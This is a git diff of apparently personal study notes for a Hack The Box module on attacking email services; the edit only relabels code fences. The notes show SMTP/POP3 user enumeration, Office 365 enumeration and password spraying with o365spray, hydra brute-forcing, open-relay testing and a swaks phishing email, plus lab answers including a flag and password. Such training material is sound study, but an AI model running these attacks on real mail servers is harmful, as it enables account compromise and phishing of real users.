@@ -4,7 +4,7 @@ We can use the **Mail eXchanger** (`MX`) DNS record to identify a mail server. T
 
 We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the `MX` records:
 
-```sh
+```shellsession
 $ host -t MX hackthebox.eu
 
 hackthebox.eu mail is handled by 1 aspmx.l.google.com.
@@ -59,7 +59,7 @@ If we are targetting a custom mail server implementation such as `inlanefreight.
 </tbody>
 </table>
 
-```sh
+```shellsession
 $ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
 ```
 
@@ -69,7 +69,7 @@ The SMTP server has different commands that can be used to enumerate valid usern
 
 `VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.
 
-```sh
+```shellsession
 $ telnet 10.10.110.20 25
 
 Trying 10.10.110.20...
@@ -95,7 +95,7 @@ VRFY new-user
 
 `EXPN` is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as "all."
 
-```sh
+```shellsession
 $ telnet 10.10.110.20 25
 
 Trying 10.10.110.20...
@@ -117,7 +117,7 @@ EXPN support-team
 
 `RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
 
-```sh
+```shellsession
 $ telnet 10.10.110.20 25
 
 Trying 10.10.110.20...
@@ -148,7 +148,7 @@ RCPT TO:john
 
 We can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.
 
-```sh
+```shellsession
 $ telnet 10.10.110.20 110
 
 Trying 10.10.110.20...
@@ -168,7 +168,7 @@ USER john
 
 To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.
 
-```sh
+```shellsession
 $ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 
 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
@@ -201,7 +201,7 @@ Target domain ............ inlanefreight.htb
 
 Let's first validate if our target domain is using Office 365.
 
-```sh
+```shellsession
 $ python3 o365spray.py --validate --domain msplaintext.xyz
 
             *** O365 Spray ***            
@@ -222,7 +222,7 @@ $ python3 o365spray.py --validate --domain msplaintext.xyz
 
 Now, we can attempt to identify usernames.
 
-```sh
+```shellsession
 $ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                        
             *** O365 Spray ***             
@@ -256,13 +256,13 @@ $ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
 ## Password Attacks
 ### Hydra - Password Attack
 
-```sh
+```shellsession
 $ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 ```
 
 ### O365 Spray - Password Spraying
 
-```sh
+```shellsession
 $ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
 ```
 
@@ -272,7 +272,7 @@ An open relay is a SMTP server, which is improperly configured and allows an una
 ### Open Relay
 With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.
 
-```sh
+```shellsession
 $ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
@@ -286,14 +286,14 @@ PORT   STATE SERVICE
 
 Next, we can use any mail client to connect to the mail server and send our email.
 
-```sh
+```shellsession
 $ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
 ```
 
 ## Questions
 1. What is the available username for the domain inlanefreight.htb in the SMTP server? **Answer: marlin**
    - Enumerate user using `smtp-user-enum` with the user list from the HTB provided resource:
-      ```sh
+      ```shellsession
       $ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.36.63
       Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 
@@ -317,7 +317,7 @@ $ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com 
       ```
 2. Access the email account using the user credentials that you discovered and submit the flag in the email as your answer. **Answer: HTB{w34k_p4$$w0rd}**
    - Brute-force the password using the HTB provided resource:
-      ```sh
+      ```shellsession
       $ hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.36.63 pop3
       <SNIP>
       [110][pop3] host: 10.129.36.63   login: marlin@inlanefreight.htb   password: poohbear
@@ -326,7 +326,7 @@ $ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com 
       <SNIP>
       ```
    - Interact with email server and retrieve the flag:
-      ```sh
+      ```shellsession
       $ telnet 10.129.36.63 110
       Trying 10.129.36.63...
       Connected to 10.129.36.63.
